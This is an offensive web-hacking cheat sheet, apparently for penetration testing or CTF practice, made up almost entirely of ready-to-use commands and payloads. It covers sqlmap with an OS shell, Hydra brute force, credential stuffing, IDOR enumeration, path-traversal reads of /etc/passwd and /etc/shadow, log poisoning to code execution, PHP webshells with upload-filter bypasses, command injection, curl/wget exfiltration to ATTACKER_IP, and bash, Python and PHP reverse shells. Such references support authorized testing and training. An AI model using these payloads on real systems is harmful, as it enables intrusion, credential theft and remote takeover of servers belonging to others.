01 Recon & Scanning
# Nikto — Web Server Scan
bash 
# Basic scan
nikto -h http://target.com

# Scan specific port
nikto -h http://target.com -p 8080

# Save output
nikto -h http://target.com -o nikto_out.txt
# Directory & File Fuzzing
bash 
# gobuster dir
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,bak

# ffuf — fast fuzzing
ffuf -u http://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt

# ffuf with extensions
ffuf -u http://target.com/FUZZ -w wordlist.txt -e .php,.html,.bak,.zip

# ffuf filter by status code
ffuf -u http://target.com/FUZZ -w wordlist.txt -mc 200,301,302

# SQLMap
bash 
# GET parameter
sqlmap -u "http://target.com/page.php?id=1" --dbs --batch

# POST parameter
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=test" --dbs --batch

# Dump specific DB
sqlmap -u "http://target.com/page.php?id=1" -D target_db --tables

# Dump specific table
sqlmap -u "http://target.com/page.php?id=1" -D target_db -T users --dump

# From Burp Suite request file
sqlmap -r request.txt --dbs --batch

# Risk/level for harder targets
sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3 --dbs

# Try to get OS shell
sqlmap -u "http://target.com/page.php?id=1" --os-shell

# Hydra — Brute Force Login
bash 
# HTTP POST form brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid"

# HTTP GET basic auth
hydra -l admin -P rockyou.txt -s 80 target.com http-get /admin

# User list spray
hydra -L users.txt -P passwords.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:error"
# Burp Intruder — Credential Stuffing
workflow 
# 1. Capture login POST in Burp Proxy
# 2. Send to Intruder (Ctrl+I)
# 3. Set attack type: Cluster Bomb (for user+pass)
# 4. Mark §username§ and §password§ positions
# 5. Set payloads for each position
# 6. Sort results by response length — different = success
05 IDOR (Insecure Direct Object Reference)
What to look for: Numeric IDs, GUIDs, usernames, or filenames in URLs and request bodies that reference server-side objects.
# Common IDOR Test Points
examples 
# URL parameter manipulation
http://target.com/profile?id=1001  →  try id=1002, id=1, id=0

# File download IDOR
http://target.com/download?file=user_1001_invoice.pdf  →  change to user_1002

# API endpoint IDOR
GET /api/users/1001/orders  →  try /api/users/1/orders

# POST body IDOR (intercept with Burp)
{"user_id": "1001", "action": "view"}  →  change user_id to 1002

# Cookie/header manipulation
# Check if user ID is in cookie and modify it
# Burp Intruder — IDOR Enumeration
workflow 
# 1. Capture request: GET /profile?id=1001
# 2. Send to Intruder
# 3. Mark §1001§ as position
# 4. Payload: Numbers, range 1000-1100
# 5. Filter by response length — different = different user data
06 LFI / Path Traversal
# Local File Inclusion Payloads
payloads 
# Basic traversal
?file=../../../../etc/passwd
?page=../../../etc/shadow
?path=....//....//....//etc/passwd

# URL encoded
?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd
?file=..%2F..%2F..%2Fetc%2Fpasswd

# Null byte (older PHP)
?file=../../../../etc/passwd%00

# Windows targets
?file=../../../../windows/win.ini
?file=../../../../windows/system32/drivers/etc/hosts

# Useful files to target
/etc/passwd          # user list
/etc/shadow          # password hashes (needs root)
/etc/hosts           # network info
/proc/self/environ   # env variables → may lead to RCE
/var/log/apache2/access.log  # log poisoning
# Log Poisoning → RCE via LFI
bash 
# 1. Poison the log with PHP via User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com

# 2. Include the log and pass command
http://target.com/page.php?file=../../../../var/log/apache2/access.log&cmd=id
07 File Upload Vulnerabilities
Goal: Upload a PHP webshell and access it via browser to execute commands on the server.
# PHP Webshell
php 
# Minimal webshell
<?php system($_GET['cmd']); ?>

# Save as: shell.php
# Access: http://target.com/uploads/shell.php?cmd=id

# Reverse shell via webshell
http://target.com/uploads/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
# Bypass Techniques
techniques 
# Double extension
shell.php.jpg
shell.php.png

# Change Content-Type in Burp

# Null byte (older servers)
shell.php%00.jpg

# Alternative PHP extensions
shell.phtml
shell.pHp
shell.php5
shell.shtml

# Add magic bytes to bypass content check (prepend to file)
GIF89a;<?php system($_GET['cmd']); ?>
08 Command Injection
# Injection Operators
payloads 
# Linux operators
; id                # semicolon — run after
| id                # pipe — pipe output
|| id               # OR — run if first fails
&& id               # AND — run if first succeeds
`id`                # backtick — command substitution
$(id)               # subshell

# Useful commands to inject
; whoami
; cat /etc/passwd
; ls -la /var/www/html
; cat /var/www/html/config.php

# Blind command injection — trigger delay
; sleep 5
| ping -c 5 127.0.0.1

# Out-of-band detection (need external server)
; curl http://ATTACKER_IP/$(id)
; wget http://ATTACKER_IP/?x=$(whoami)

# Reverse Shell One-Liners
bash 
# Start listener first
nc -lvnp 4444

# Bash reverse shell
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Upgrade to full TTY after catching shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Then: Ctrl+Z → stty raw -echo; fg → export TERM=xterm
